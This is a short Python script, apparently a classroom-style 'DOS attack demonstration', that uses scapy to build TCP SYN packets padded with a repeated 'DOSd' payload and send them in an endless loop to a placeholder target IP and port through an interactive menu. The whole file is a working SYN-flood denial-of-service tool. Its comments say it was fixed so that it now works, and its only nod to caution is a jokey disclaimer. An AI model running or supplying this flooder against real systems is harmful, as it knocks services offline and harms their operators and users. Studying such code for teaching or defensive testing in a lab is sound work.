# Simulating tcp syn flood

# This version of tcp syn flood does not seem to work as intended. Modify the code.
#Modified it. It works...

from scapy.all import *

def create_packet(tar_ip, tar_port):
    target_ip = tar_ip
    target_port  = tar_port

    # creating IP packet 
    ip = IP(dst = target_ip)
    #print(ip)

    # creating TCP packet setting only SYN field bit to 1

    tcp = TCP(sport = RandShort(), dport = target_port, flags = "S")
    #print(tcp)

    data = Raw(b"DOSd"*256)
    #print(data)

    # COmbine IP, TCP and data into one single packet

    p = ip/tcp/data

    return p

def attack(p):
    '''
    count = 0
    while(count < 1,000):
        send(p, loop = 0, verbose = 0)
        count += 1
    print(count, " packets sent")    
    '''    
    print("Attacking...")
    send(p, loop = 1, verbose = 0)
            

def main():
    print("Welcome to DOS attack demonstration. Be smart, be safe, don't try this at home")
    in_progress = True

    while(in_progress):
        print("Enter your choice:")
        print("1. Start attack    2. Exit")
        n = int(input())
        if n == 1:
            pkt = create_packet("target_ip", 12345)   
            attack(pkt)
            print("Packets sent")
        elif n == 2: 
            print("-------------------------------------------")
            print("With great power comes great responsibility")
            print("-------------------------------------------")
            in_progress = False
        else: 
            print("Enter valid choice")    
        

    print("DOS demonstration completed")     

main()       






